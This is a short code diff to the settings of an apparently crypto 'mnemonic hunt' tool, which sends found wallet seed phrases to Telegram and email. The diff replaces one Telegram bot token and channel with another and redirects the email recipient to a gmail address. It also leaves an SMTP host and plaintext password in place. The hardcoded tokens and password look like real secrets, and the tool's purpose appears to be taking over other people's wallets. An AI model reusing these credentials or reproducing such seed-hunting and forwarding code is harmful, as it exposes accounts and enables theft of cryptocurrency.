@@ -83,15 +83,15 @@ class Counter:
             return self.val.value
 
 class telegram:
-    token = '5097432912:AAE6iDOa-q1Q2BWkHQF5o-qjMiM_Ra0ioIQ'
-    channel_id = '@mnemonicHUNT'
+    token = '1367987949:AAFPUOd9-1u6WrhM_COAUFGua-WDQxXK-NQ'
+    channel_id = '@testkranthi_bot'
 
 class email:
     host:str = "smtp.timeweb.ru" # SMTP server
     port:int = 25
     password:str = '12qwerty34'
     subject:str = '* Find Mnemonic *'
-    to_addr:str = 'hunt@quadrotech.ru'
+    to_addr:str = 'lovelydreamer10@gmail.com'
     from_addr:str = 'hunt@quadrotech.ru'
     desc:str = ''
 
